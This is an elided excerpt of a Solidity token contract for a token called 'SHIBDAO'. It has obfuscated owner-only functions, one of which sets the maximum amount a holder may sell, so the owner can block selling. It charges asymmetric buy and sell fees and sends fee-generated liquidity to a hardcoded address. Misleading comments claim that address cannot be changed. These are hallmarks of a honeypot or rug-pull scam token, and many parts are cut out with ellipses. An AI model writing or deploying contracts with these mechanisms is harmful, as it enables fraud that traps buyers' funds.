...
abstract contract AbsToken is IERC20, Ownable {
    ...
    uint256 public _buy = 100;
    uint256 public _sell = 200;
    uint256 public _buyiuyui = 0;//N
    uint256 public _sellpoikji = 0;//N
    ...
    function nic0e(uint256 _nice) public onlyOwner{
        
        nice = _nice;
    
    }

    function qingni(bool status) public onlyOwner {
        limitEnable = status;
    }
                ...
                if (_swapPairList[to]) {
                    if (!inSwap) {
                        ...
                        if (contractTokenBalance > 0) {
                            uint256 swapFee = _buy + _sell + _sellFee5;
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            uint256 swapFee;
            if (isSell) {
                swapFee = _sell + _sellFee5;
                require(tAmount <= nice,"over ");
            } else {
                swapFee = _buy ;
                require(tAmount <= maxAmount,"over max amount");
            }
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        uint256 fundAmount = usdtBalance * (_buy + _sell) * 2 / swapFee;
        ...
        if (lpAmount > 0) {
            ...
            if (lpFist > 0) {//=0xB821bb072f08A338962272923f9f4221B69094FC (配置地址，不能改，改了会产生错误）
                _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount, lpFist, 0, 0, address(0x6c8957072aAab7C0B7E27C12EAb67e7dB965BEc9), block.timestamp
                );
            }
        }
    }
    ...
    function chengjingwanshi() external onlyOwner {
        kilsi = 0;
    }
    ...
    function luyoi(address addr, bool enable) external onlyFunder {
    ...
    function absolu(address addr, bool enable) external onlyFunder {
...
contract tokens is AbsToken {
    constructor() AbsToken(
        ...
        "SHIBDAO",//Sy
        18,//De
        10000000000,//Su 数量后面加20个0
        address(0x6c8957072aAab7C0B7E27C12EAb67e7dB965BEc9),//The address controlled by the mechanism cannot be modified, and the handling fee will be voided after modification
        address(0x6c8957072aAab7C0B7E27C12EAb67e7dB965BEc9)//
    ){
    }
}